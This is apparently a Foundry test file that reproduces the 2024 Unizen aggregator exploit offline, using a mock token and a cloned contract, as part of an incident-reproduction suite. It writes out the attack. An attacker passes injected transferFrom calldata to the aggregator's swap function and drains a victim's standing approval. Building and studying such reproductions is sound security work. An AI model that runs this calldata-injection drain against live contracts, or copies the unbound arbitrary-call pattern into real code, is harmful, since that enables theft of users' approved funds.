// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {UnizenAggregatorClone} from "../fixtures/malicious-calldata/b-incident/UnizenAggregatorClone.sol";

/// @title malicious-calldata tier (b): Unizen aggregator exploit (2024-03-08, Ethereum, ~$2.1M).
/// @notice Minimized offline reproduction of the documented mechanism: after an upgrade, the
///         aggregator's swap flow performed an arbitrary external call without binding the
///         token source to msg.sender or restricting to trusted routers. The attacker supplied
///         a call to a victim's token with transferFrom(victim, attacker, amount); the
///         aggregator ran it as msg.sender and drained the standing approval. See PROVENANCE.md.
contract UnizenAggregatorIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 150_000e18; // representative, scaled
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD57);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_unizen_aggregatorSwap_arbitraryCall_drains() public {
        MockERC20 token = new MockERC20();
        UnizenAggregatorClone aggregator = new UnizenAggregatorClone();

        // A user holds funds and grants the aggregator an approval (the exploited standing state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(aggregator), type(uint256).max);

        // ATTACK: swap with targetDex=token, dexCalldata=transferFrom(victim -> attacker).
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        vm.prank(ATTACKER);
        aggregator.swap(address(token), injected);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("unizen-aggregator-victim", drained);

        assertTrue(drained, "unbound aggregator swap call should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
